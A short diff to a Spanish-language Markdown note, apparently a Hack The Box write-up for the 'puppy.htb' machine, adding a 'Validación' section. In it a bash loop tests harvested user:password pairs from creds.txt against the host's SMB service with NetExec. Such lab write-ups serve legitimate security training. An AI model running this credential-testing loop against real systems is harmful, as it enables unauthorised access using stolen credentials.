@@ -225,3 +225,10 @@ obtenemos una lista de usuarios y contraseñas que podemos usar para hacer valid
 normalmente la nomenclatura de las credenciales se hace de la siguiente forma nombre.apellido 
 ![[Pasted image 20250606165120.png]]
 
+
+### Validación
+
+```python
+❯ while IFS=: read -r user pass; do echo "[*] Testing $user:$pass"; nxc smb puppy.htb -u "$user" -p "$pass"; done < creds.txt
+```
+![[Pasted image 20250606165322.png]]
